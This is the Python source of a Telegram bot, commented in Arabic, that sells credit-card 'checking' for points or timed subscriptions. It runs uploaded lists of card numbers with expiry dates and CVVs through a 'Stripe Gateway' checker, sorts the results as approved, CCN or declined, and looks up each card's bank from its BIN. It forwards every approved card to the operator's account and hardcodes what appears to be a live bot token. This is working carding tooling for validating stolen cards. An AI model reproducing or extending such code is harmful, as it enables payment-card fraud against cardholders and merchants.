import telebot, os
import re, json
import requests
import telebot, time, random
import random
import string
from telebot import types
from gatet import *  # استيراد دالة chkk
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup

# ==================== ملفات التخزين ====================
POINTS_FILE = "points.json"
BANNED_FILE = "banned.json"
CODES_FILE = "codes.json"
SUBSCRIPTIONS_FILE = "subscriptions.json"

# تحميل بيانات النقاط
def load_points():
    if os.path.exists(POINTS_FILE):
        with open(POINTS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_points(points):
    with open(POINTS_FILE, 'w') as f:
        json.dump(points, f, indent=4)

# تحميل بيانات المحظورين
def load_banned():
    if os.path.exists(BANNED_FILE):
        with open(BANNED_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_banned(banned):
    with open(BANNED_FILE, 'w') as f:
        json.dump(banned, f, indent=4)

# تحميل بيانات الاشتراكات الزمنية
def load_subscriptions():
    if os.path.exists(SUBSCRIPTIONS_FILE):
        with open(SUBSCRIPTIONS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_subscriptions(subscriptions):
    with open(SUBSCRIPTIONS_FILE, 'w') as f:
        json.dump(subscriptions, f, indent=4)

def has_active_subscription(user_id):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    if user_id_str not in subs:
        return False
    expiry_str = subs[user_id_str]
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        return expiry > datetime.now()
    except:
        return False

def set_subscription(user_id, hours):
    expiry = datetime.now() + timedelta(hours=hours)
    expiry_str = expiry.strftime("%Y-%m-%d %H:%M")
    subs = load_subscriptions()
    subs[str(user_id)] = expiry_str
    save_subscriptions(subs)

# تحميل بيانات الأكواد
def load_codes():
    if os.path.exists(CODES_FILE):
        with open(CODES_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=4)

def generate_code(hours, target_user_id=None):
    characters = string.ascii_uppercase + string.digits
    code = 'TOME-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4))
    expiry = datetime.now() + timedelta(hours=hours)
    codes = load_codes()
    codes[code] = {
        "hours": hours,
        "target_user": target_user_id,
        "expiry": expiry.strftime("%Y-%m-%d %H:%M"),
        "used": False
    }
    save_codes(codes)
    return code

def redeem_code(code, user_id):
    codes = load_codes()
    if code not in codes:
        return False, "الكود غير صحيح"
    code_data = codes[code]
    if code_data["used"]:
        return False, "تم استخدام هذا الكود بالفعل"
    expiry = datetime.strptime(code_data["expiry"], "%Y-%m-%d %H:%M")
    if expiry < datetime.now():
        return False, "انتهت صلاحية الكود"
    target = code_data["target_user"]
    if target is not None and target != user_id:
        return False, "هذا الكود ليس مخصص لك"
    # تفعيل الاشتراك
    hours = code_data["hours"]
    set_subscription(user_id, hours)
    code_data["used"] = True
    save_codes(codes)
    return True, f"تم تفعيل الاشتراك لمدة {hours} ساعة"

# ==================== دالة لاختصار الردود ====================
def shorten_response(text, max_length=50):
    if not text:
        return text
    if '|' in text:
        parts = text.split('|', 1)
        return parts[0].strip()
    if len(text) > max_length:
        return text[:max_length] + '...'
    return text

# ==================== كلمات مفتاحية للتصنيف ====================
APPROVED_KEYWORDS = [
    'Charged', 'CHARGE', 'succeeded', 'thank you for your donation',
    'Thank you', 'Success', 'Approved', 'donation confirmed'
]

CCN_KEYWORDS = [
    'security code is incorrect', 'CVV2_FAILURE', 'CVV2',
    'CVC_FAILURE', 'cvv', 'Cvv', 'incorrect security code',
    'incorrect_CVV2'
]

# ==================== إعدادات البوت ====================
stopuser = {}
token = "8683847930:AAFKBgcO8N_zyMO8Hr4ORqiX-6Ab4BdGiNc"
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 1093032296
active_scans = set()
command_usage = {}

# ==================== دوال التحقق من النقاط والحظر ====================
def has_points(user_id, required=1):
    # إذا كان المستخدم لديه اشتراك نشط، لا يستهلك نقاط
    if has_active_subscription(user_id):
        return True
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points:
        return False
    return points[user_id_str] >= required

def deduct_points(user_id, required=1):
    # إذا كان المستخدم لديه اشتراك نشط، لا يستهلك نقاط
    if has_active_subscription(user_id):
        return True
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points or points[user_id_str] < required:
        return False
    points[user_id_str] -= required
    save_points(points)
    return True

def add_points(user_id, amount):
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points:
        points[user_id_str] = 0
    points[user_id_str] += amount
    save_points(points)

def set_points(user_id, amount):
    points = load_points()
    user_id_str = str(user_id)
    points[user_id_str] = amount
    save_points(points)

def get_points(user_id):
    points = load_points()
    user_id_str = str(user_id)
    return points.get(user_id_str, 0)

def is_banned(user_id):
    banned = load_banned()
    return str(user_id) in banned

def ban_user(user_id):
    banned = load_banned()
    banned[str(user_id)] = True
    save_banned(banned)

def unban_user(user_id):
    banned = load_banned()
    if str(user_id) in banned:
        del banned[str(user_id)]
        save_banned(banned)

# ==================== دالة معلومات البنك ====================
def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        mn = f'''• BIN Info : {brand} - {card_type} - {level}
• Bank : {bank} - {country_flag}
• Country : {country_name} [ {country_flag} ]'''
        return mn
    except:
        return 'No info'

# ==================== أمر start ====================
@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    username = message.from_user.username
    
    if is_banned(user_id):
        bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    # إشعار المالك بمستخدم جديد
    msg_to_admin = f"🆕 مستخدم جديد دخل البوت!\n👤 الاسم: {first_name}\n🆔 ID: {user_id}\n📛 اليوزر: @{username if username else 'لا يوجد'}"
    bot.send_message(admin, msg_to_admin)
    
    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="✨ JOIN ✨", url="https://t.me/+WwjBeTcnFz0yZWVi")
    keyboard.add(contact_button)
    
    # التحقق من وجود اشتراك نشط
    if has_active_subscription(user_id):
        expiry = load_subscriptions().get(str(user_id), "غير معروف")
        bot.send_message(chat_id=message.chat.id, text=f'''<b>
اهلا بك عزيزي {first_name}
✅ اشتراكك نشط حتى: {expiry}
📊 نقاطك: {get_points(user_id)}
</b>
''', reply_markup=keyboard)
    else:
        bot.send_message(chat_id=message.chat.id, text=f'''<b>
اهلا بك عزيزي {first_name}
📊 نقاطك: {get_points(user_id)}
للحصول على نقاط أو اشتراك تواصل مع المالك: @Jo0000ker
</b>
''', reply_markup=keyboard)

# ==================== أمر عرض الأوامر للمالك /cmds ====================
@bot.message_handler(commands=["cmds"])
def admin_commands(message):
    if message.from_user.id != admin:
        # إذا كان المستخدم عادي يظهر له أوامر عادية
        user_id = message.from_user.id
        if is_banned(user_id):
            bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
            return
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text=f"✨ نقاطك: {get_points(user_id)} ✨", callback_data='plan')
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝗦 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

Stripe Gateway ✅ <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘
</b>
''', reply_markup=keyboard)
        return
    
    # أوامر المالك
    commands_text = '''
👑 <b>أوامر المالك</b> 👑

━━━━━━━━━━━━━━━━
📦 <b>أوامر الأكواد والاشتراكات:</b>
• <code>/code عدد_الساعات</code> - إنشاء كود لنفسك
• <code>/code عدد_الساعات user_id</code> - إنشاء كود لمستخدم

━━━━━━━━━━━━━━━━
⭐ <b>أوامر النقاط:</b>
• <code>/addpoints ID عدد</code> - إضافة نقاط
• <code>/rempoints ID عدد</code> - حذف نقاط
• <code>/setpoints ID عدد</code> - تعيين رصيد نقاط
• <code>/points ID</code> - عرض رصيد مستخدم

━━━━━━━━━━━━━━━━
🚫 <b>أوامر الحظر:</b>
• <code>/block ID</code> - حظر مستخدم
• <code>/unblock ID</code> - إلغاء حظر

━━━━━━━━━━━━━━━━
📋 <b>أوامر المستخدمين:</b>
• <code>/mypoints</code> - عرض رصيدك
• <code>/chk بطاقة|شهر|سنة|cvv</code> - فحص بطاقة
• <code>/redeem كود</code> - تفعيل كود اشتراك
• <code>/start</code> - بدء البوت
• <code>/cmds</code> - عرض الأوامر

━━━━━━━━━━━━━━━━
💡 <b>ملاحظة:</b> الاشتراك الزمني يلغي استهلاك النقاط
'''
    bot.send_message(admin, commands_text)

# ==================== رفع ملف ====================
@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    lines = downloaded.decode('utf-8', errors='ignore').splitlines()
    total_cards = len([line for line in lines if line.strip()])
    
    if not has_points(user_id, total_cards):
        points = get_points(user_id)
        if has_active_subscription(user_id):
            # لو عنده اشتراك المفروض has_points يرجع True
            pass
        else:
            bot.reply_to(message, f"❌ نقاطك غير كافية!\nلديك {points} نقطة وتحتاج {total_cards} نقطة لفحص هذا الملف.\nللحصول على نقاط تواصل مع @Jo0000ker")
            return
    
    if user_id in active_scans:
        bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت انتظر الملف الاول يخلص فحص او انت وقفه و بعدين تعال افحص الملف الثاني")
        return
    else:
        active_scans.add(user_id)
    
    if not deduct_points(user_id, total_cards):
        bot.reply_to(message, "❌ حدث خطأ في خصم النقاط")
        active_scans.remove(user_id)
        return
    
    with open("combo.txt", "wb") as w:
        w.write(downloaded)
    
    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="Stripe Gateway", callback_data='br')
    keyboard.add(contact_button)
    bot.reply_to(message, text='𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚', reply_markup=keyboard)

# ==================== معالجة الملف ====================
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def process_combo(call):
    def my_function():
        id = call.from_user.id
        user_id = call.from_user.id
        gate = 'Stripe Gateway'
        dd = 0
        live = 0
        ccnn = 0
        
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {'status': 'start'}
                
                for cc in lino:
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.chat.id, message_id=call.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @Jo0000ker')
                        return
                    
                    cc = cc.strip()
                    if not cc:
                        continue
                    
                    info = str(dato(cc[:6]))
                    start_time = time.time()
                    try:
                        raw_response = str(chkk(cc))
                    except Exception as e:
                        print(e)
                        raw_response = "ERROR"
                    
                    clean_response = shorten_response(raw_response)
                    
                    if any(kw in raw_response for kw in APPROVED_KEYWORDS):
                        category = 'approved'
                        live += 1
                        user = call.from_user
                        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {user.first_name}\n🆔 ID: {user.id}\n💳 البطاقة: {cc}\n📝 الرد: {clean_response}"
                        bot.send_message(admin, admin_notify)
                    elif any(kw in raw_response for kw in CCN_KEYWORDS):
                        category = 'ccn'
                        ccnn += 1
                    else:
                        category = 'declined'
                        dd += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• Response ➜ {clean_response} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• Approved ✅ ➜ [ {live} ] •", callback_data='x')
                    ccn_btn = types.InlineKeyboardButton(f"• CCN ☑️ ➜ [ {ccnn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• Declined ❌ ➜ [ {dd} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• Total 👻 ➜ [ {total} ] •", callback_data='x')
                    stop_btn = types.InlineKeyboardButton("[ Stop ]", callback_data='stop')
                    mes.add(cm1, status, cm3, ccn_btn, cm4, cm5, stop_btn)
                    
                    end_time = time.time()
                    execution_time = end_time - start_time
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Jo0000ker''',
                        reply_markup=mes
                    )
                    
                    if category == 'approved':
                        msg_approved = f'''<b>Approved ✅

• Card : <code>{cc}</code>
• Response : {clean_response}
• Gateway : {gate}		
{info}
• Vbv : Error
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''
                        bot.send_message(call.from_user.id, msg_approved)
                    
                    time.sleep(2)
        except Exception as e:
            print(e)
        finally:
            if user_id in active_scans:
                active_scans.remove(user_id)
        
        stopuser[f'{id}']['status'] = 'start'
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @Jo0000ker'
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ==================== فحص يدوي /chk ====================
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def manual_check(message):
    user_id = message.from_user.id
    gate = 'Stripe Gateway'
    name = message.from_user.first_name
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    if not has_points(user_id, 1):
        points = get_points(user_id)
        if has_active_subscription(user_id):
            pass
        else:
            bot.reply_to(message, f"❌ نقاطك غير كافية!\nلديك {points} نقطة وتحتاج 1 نقطة لفحص بطاقة.\nللحصول على نقاط تواصل مع @Jo0000ker")
            return
    
    try:
        command_usage[user_id]['last_time']
    except:
        command_usage[user_id] = {'last_time': datetime.now()}
    
    current_time = datetime.now()
    if command_usage[user_id]['last_time'] is not None:
        time_diff = (current_time - command_usage[user_id]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
            return
    
    ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
    
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    if not deduct_points(user_id, 1):
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="❌ حدث خطأ في خصم النقاط، حاول مرة أخرى.")
        return
    
    start_time = time.time()
    try:
        command_usage[user_id]['last_time'] = datetime.now()
        raw_response = str(chkk(cc))
    except Exception as e:
        raw_response = 'Error'
    
    clean_response = shorten_response(raw_response)
    
    if any(kw in raw_response for kw in APPROVED_KEYWORDS):
        category = 'approved'
        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {clean_response}"
        bot.send_message(admin, admin_notify)
    elif any(kw in raw_response for kw in CCN_KEYWORDS):
        category = 'ccn'
    else:
        category = 'declined'
    
    info = dato(cc[:6])
    end_time = time.time()
    execution_time = end_time - start_time
    
    msg_approved = f'''<b>Approved ✅

• Card : <code>{cc}</code>
• Response : {clean_response}
• Gateway : {gate}		
{info}
• Vbv : Error
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''
    
    msg_ccn = f'''<b>CCN ☑️

• Card : <code>{cc}</code>
• Response : {clean_response}
• Gateway : {gate}
{info}
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''
    
    msg_declined = f'''<b>Declined ❌

• Card : <code>{cc}</code>
• Response : {clean_response}
• Gateway : {gate}		
{info}
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''
    
    if category == 'approved':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_approved)
    elif category == 'ccn':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_ccn)
    else:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_declined)

# ==================== أمر إنشاء كود /code للمالك ====================
@bot.message_handler(commands=["code"])
def code_command(message):
    if message.from_user.id != admin:
        return
    
    try:
        parts = message.text.split()
        hours = int(parts[1])
        target_user = None
        if len(parts) >= 3:
            target_user = int(parts[2])
        
        code = generate_code(hours, target_user)
        if target_user:
            bot.reply_to(message, f"✅ تم إنشاء كود للمستخدم {target_user}\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة")
            # إرسال الكود للمستخدم المستهدف
            try:
                bot.send_message(target_user, f"🎉 تم إنشاء كود اشتراك لك!\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة\nاستخدم الأمر <code>/redeem {code}</code> لتفعيل الاشتراك", parse_mode="HTML")
            except:
                pass
        else:
            bot.reply_to(message, f"✅ تم إنشاء كود لك\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ خطأ: /code عدد_الساعات\nأو /code عدد_الساعات user_id")

# ==================== أمر تفعيل الكود /redeem ====================
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def redeem(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    try:
        code = message.text.split(' ')[1]
        success, msg = redeem_code(code, user_id)
        if success:
            expiry = load_subscriptions().get(str(user_id), "غير معروف")
            bot.reply_to(message, f"✅ {msg}\n📅 ينتهي في: {expiry}\n💡 ملاحظة: أثناء الاشتراك لن تستهلك نقاطك", parse_mode="HTML")
        else:
            bot.reply_to(message, f"❌ {msg}", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ خطأ: /redeem الكود")

# ==================== أوامر النقاط (للمالك فقط) ====================
@bot.message_handler(commands=["addpoints"])
def add_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        add_points(user_id, amount)
        bot.reply_to(message, f"✅ تم إضافة {amount} نقطة للمستخدم {user_id}\nالرصيد الحالي: {get_points(user_id)}")
    except:
        bot.reply_to(message, "❌ خطأ: /addpoints ID عدد")

@bot.message_handler(commands=["rempoints"])
def rem_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        current = get_points(user_id)
        new_amount = max(0, current - amount)
        set_points(user_id, new_amount)
        bot.reply_to(message, f"✅ تم حذف {amount} نقطة من المستخدم {user_id}\nالرصيد الحالي: {get_points(user_id)}")
    except:
        bot.reply_to(message, "❌ خطأ: /rempoints ID عدد")

@bot.message_handler(commands=["setpoints"])
def set_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        set_points(user_id, amount)
        bot.reply_to(message, f"✅ تم تعيين رصيد {amount} نقطة للمستخدم {user_id}")
    except:
        bot.reply_to(message, "❌ خطأ: /setpoints ID عدد")

@bot.message_handler(commands=["mypoints"])
def my_points_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    if has_active_subscription(user_id):
        expiry = load_subscriptions().get(str(user_id), "غير معروف")
        points = get_points(user_id)
        bot.reply_to(message, f"💰 لديك اشتراك نشط حتى {expiry}\n📊 نقاطك المحفوظة: {points} نقطة\n💡 ملاحظة: أثناء الاشتراك لا تستهلك نقاطك")
    else:
        points = get_points(user_id)
        bot.reply_to(message, f"💰 رصيدك الحالي: {points} نقطة")

@bot.message_handler(commands=["points"])
def points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        points = get_points(user_id)
        if has_active_subscription(user_id):
            expiry = load_subscriptions().get(str(user_id), "غير معروف")
            bot.reply_to(message, f"💰 رصيد المستخدم {user_id}: {points} نقطة\n✅ لديه اشتراك نشط حتى {expiry}")
        else:
            bot.reply_to(message, f"💰 رصيد المستخدم {user_id}: {points} نقطة")
    except:
        bot.reply_to(message, "❌ خطأ: /points ID")

# ==================== أوامر الحظر (للمالك فقط) ====================
@bot.message_handler(commands=["block"])
def block_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        ban_user(user_id)
        bot.reply_to(message, f"✅ تم حظر المستخدم {user_id}")
        try:
            bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ خطأ: /block ID")

@bot.message_handler(commands=["unblock"])
def unblock_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        unban_user(user_id)
        bot.reply_to(message, f"✅ تم إلغاء حظر المستخدم {user_id}")
        try:
            bot.send_message(user_id, "✅ تم إلغاء حظرك، يمكنك استخدام البوت الآن.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ خطأ: /unblock ID")

# ==================== إيقاف الفحص ====================
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    id = call.from_user.id
    stopuser[f'{id}']['status'] = 'stop'
    bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص")

# ==================== تشغيل البوت ====================
print("تم تشغيل البوت")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"حدث خطأ: {e}")